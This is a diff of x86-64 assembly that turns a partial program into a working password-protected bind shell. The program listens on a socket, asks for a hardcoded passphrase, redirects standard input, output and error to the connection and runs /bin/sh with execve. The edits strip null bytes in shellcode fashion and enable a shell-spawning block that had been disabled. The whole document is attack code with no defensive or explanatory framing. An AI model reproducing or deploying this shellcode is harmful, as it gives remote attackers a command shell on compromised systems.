@@ -3,10 +3,41 @@ section .text
 
 _start:
 	mov rbp, rsp
-	jmp _data	  	; Find string address
+	jmp short _data	  	; Find address of string list
+
+_getref:	; Keep reference to strings
+	pop r15
+	jmp _main
+
+_data:
+	call _getref		; call pushes RIP onto stack
+	prompt: db "Speak friend and enter: "
+	pass:	db "password", 0xa
+	good:	db "Welcome", 0xa
+	bad:	db "Wrong", 0xa
+
+_exit:		; exit nicely
+	xor rax, rax
+	push rax
+	pop rbx
+	add rax, 0x3c
+	add rbx, 1
+	mov rsp, rbp
+	syscall	
+
+_prompt:	; send string to a socket, RDI and RCX populated before call	
+	mov rdi, [rbp-40]
+	xor rax, rax
+	push rax
+	pop rcx
+	push rcx
+	pop r8
+	mov r9, r8
+	add rax, 44
+	syscall
+	ret
 
 _main:
-	pop r15 	  	; Keep reference to strings
 
 ; Build a server sockaddr_struct on the stack
 	xor rax, rax
@@ -29,12 +60,13 @@ _main:
 	jle _exit
 	push rax 	  	; store socket id on stack
 
-; Bind the Socket
+; Bind Socket
 	xor rax, rax
 	add rax, 49
 	mov rdi, [rbp-24]  	; socket id
 	lea rsi, [rbp-16]  	; sockaddr_in struct
-	mov rdx, 16	  	; sockaddr_in size
+	xor rdx, rdx
+	add rdx, 16	  	; sockaddr_in size
 	push rdx	  	; create size val ref on stack
 	syscall
 	cmp rax, -1
@@ -48,9 +80,8 @@ _main:
 	syscall
 	cmp rax, -1
 	jle _exit
-	nop
 
-_accept:			; Accept a connection
+_accept:
 	xor rax, rax
 	add rax, 43
 	mov rdi, [rbp-24]  	; socket id
@@ -62,97 +93,85 @@ _accept:			; Accept a connection
 
 	push rax		; Store client socket id
 
-; auth stuff
-
+; authenticate incoming connection
 	mov rsi, r15		; string address
-	mov rdx, 24		; string length
+	xor rdx, rdx
+	add rdx, 24		; string length
 	call _prompt
 
 	mov rdi, [rbp-40]	; socket id
 	lea rsi, [rbp-16]	; buffer address
-	mov rdx, 8		; buffer length
-	mov rcx, 0
-	mov r8, 0
-	mov r9, 0
-	mov rax, 45		; recvfrom
+	xor rcx, rcx 		; Zero out registers
+	mov r8, rcx
+	mov r9, rcx
+	mov rdx, rcx
+	add rdx, 8		; buffer length
+	mov rax, rcx
+	add rax, 45		; recvfrom
 	syscall
 
-	; compare strings
-	lea rsi, [rbp-16]
-	lea rdi, [r15+24]
-	mov rcx, 8		; length
-_comploop:
-	cmpsb
-	jne _badpw
-	loop _comploop	
-	
-;pass
-	lea rsi, [r15+33]
-	mov rdx, 8
+; compare strings
+	lea rsi, [rbp-16]	; input buffer address
+	lea rdi, [r15+24]	; password string address
+	xor rcx, rcx
+	add rcx, 8		; length
+
+_cmploop:
+	cmpsb			; compare bytes
+	jne _badpw		; exit if no match
+	loop _cmploop		; next char
+
+; good passphrase (fallthrough)
+	lea rsi, [r15+33]	; welcome string
+	xor rdx, rdx
+	add rdx, 8		; welcome length
 	call _prompt
-	jmp _access	
+	jmp _create_shell	; set up the shell
 
 _badpw:
-	lea rsi, [r15+41]
-	mov rdx, 6
-	call _prompt	
+	lea rsi, [r15+41]	; fail message
+	xor rdx, rdx
+	add rdx, 6		; fail length
+	call _prompt
+	xor rax, rax		; zero out regs
+	mov rsi, rax
+	add rax, 48		; shutdown client socket
+	pop rdi			; last use of client sock id
+	add rsi, 2		; SHUT_RDWR
+	syscall		
+	jmp _accept		; jump back to await another connection
 
-_access:
-	jmp _exit
+_create_shell:
 
-; Duplicate I/O descriptors 
-	mov r10, rax
-	mov r8, 33
-	mov rax, r8
-	mov rdi, r10
-	xor rsi, rsi
+; Duplicate I/O descriptors
+	xor rax, rax 
+	add rax, 33		; dup2		
+	mov r8, rax
+	mov rdi, [rbp-40]	; socket id
+	xor rsi, rsi		; STDIN
 	syscall 
 
-	mov rax, r8
-	inc rsi
+	mov rax, r8		; dup2
+	inc rsi			; STDOUT
 	syscall
 
-	mov rax, r8
-	inc rsi
+	mov rax, r8		; dup2
+	inc rsi			; STDERR
 	syscall
-%if 0
-_spawn: ; Spawn shell
+
+_spawn:
 	xor rax, rax
 	push rax
-	pop rdx
-	mov rbx, 0x68732f6e69622f78
-	shr rbx, 8
-	mov [rbp-16], rbx
-	lea rdi, [rbp-16] 
-	push rax
-	push rdi
-	mov rsi, rsp
-	add rax, 59
+	pop rdx			; less instructions than MOV
+	mov rbx, 0x68732f6e69622f78 ; build X/bin/sh
+	shr rbx, 8		; shift the ¨X¨ and append a NULL
+	mov [rbp-16], rbx	; copy ¨/bin/sh¨ string to buffer
+	lea rdi, [rbp-16] 	; get the /bin/sh string
+	push rax		; build args array, by pushing NULL
+	push rdi		; then pushing string address
+	mov rsi, rsp		; args array address
+	add rax, 59		; execve
 	syscall
-	nop
-%endif
-
-_exit:
-	mov rax, 0x3c
-	mov rbx, 1
-	syscall	
-
-_prompt:
-	mov rdi, [rbp-40]
-	mov rcx, 0
-	mov r8, 0
-	mov r9, 0
-	mov rax, 44
-	syscall
-	ret
-
-_data:
-	call _main
-	prompt: db "Speak friend and enter: "
-	pass:	db "password", 0xa
-	good:	db "Welcome", 0xa
-	bad:	db "Wrong", 0xa
-	
-
+	call _exit
 
 
